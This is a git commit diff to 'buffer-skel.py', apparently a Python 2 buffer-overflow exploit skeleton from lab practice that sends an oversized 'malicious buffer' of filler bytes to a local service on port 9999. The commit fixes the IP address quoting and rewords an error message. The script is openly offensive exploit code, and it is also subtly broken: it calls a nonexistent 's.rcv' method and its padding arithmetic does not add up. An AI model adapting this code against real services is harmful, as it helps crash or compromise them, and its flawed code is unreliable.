66f927d2c34a11d486047c87791be0b1d31d16e7
no0ne25 <62963277+no0ne25@users.noreply.github.com>
2020-03-31 17:19:48 -0400

    Update buffer-skel.py

--- buffer-skel.py
+++ buffer-skel.py
@@ -12,11 +12,11 @@ buffer = 'A'*600 + 'B'*4 + 'C'*(600-524-4)
 
 try:
   print '\nSending malicious buffer....()XXXXXX[{:::::::::>'
-  s.connect((127.0.0.1,9999))
+  s.connect(('127.0.0.1',9999))
   data = s.rcv(1024)
   s.send(buffer + '\r\n')
   print '\n0verfl0wed'
 
 except:
-  print 'Could not connect to service'
+  print 'Could not connect to service, you might have crashed it'
   
